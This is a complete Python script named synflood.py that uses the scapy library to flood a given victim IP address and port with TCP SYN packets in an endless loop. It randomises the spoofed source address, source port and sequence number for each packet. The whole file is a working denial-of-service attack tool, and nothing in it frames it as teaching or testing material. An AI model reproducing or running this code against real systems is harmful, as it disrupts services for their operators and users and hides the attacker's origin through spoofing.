#!/bin/env python3
import sys
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

def main():
    # Ensure correct usage
    if len(sys.argv) != 3:
        usage()
        sys.exit(1)
    
    # Unpack values
    ip = IP(dst = sys.argv[1])
    tcp = TCP(dport = int(sys.argv[2]), flags='S')

    print(f'Attacking {sys.argv[1]}...')
    while True:
        # Build packet
        ip.src = str(IPv4Address(getrandbits(32))) # source iP
        tcp.sport = getrandbits(16) # source port
        tcp.seq = getrandbits(32) # sequence number
        
        # Send the packet
        send(ip / tcp, verbose = 0)

def usage():
    print('Usage: ./synflood.py <ip-address> <port>\
    \n\tip-address: IP address of victim\
    \n\tport: Port number to attack\n')
    
    
if __name__ == '__main__':
    main()
